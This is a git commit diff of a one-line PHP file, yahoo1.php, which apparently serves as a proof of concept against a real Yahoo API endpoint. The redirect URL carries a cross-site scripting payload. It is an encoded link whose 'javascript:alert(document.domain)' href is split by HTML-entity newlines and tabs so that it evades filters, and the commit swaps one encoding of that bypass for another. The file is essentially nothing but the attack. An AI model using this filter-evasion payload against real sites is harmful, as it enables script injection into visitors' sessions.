71e158114592d878d6c5183c3ed65e7f4a9b8fde
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-13 00:09:38 +0100

    Update yahoo1.php

--- yahoo1.php
+++ yahoo1.php
@@ -1,6 +1,6 @@
 <?php 
 
-header('Location: https://api.view.yahoo.com/api/series/aaa%3Ca%20href="ja&NewLine;&Tab;vasc&NewLine;&Tab;ript:alert(document.domain)%3Exss%20me%3C%2Fa%3E"')
+header("Location: http://api.view.yahoo.com/api/series/xxxxx%3Ca%20href='ja&%2310;&%239;vasc&%23x0A;&%23x09;ript:alert(document.domain)'%3Eclick%3C%2Fa%3E")
 
 
 
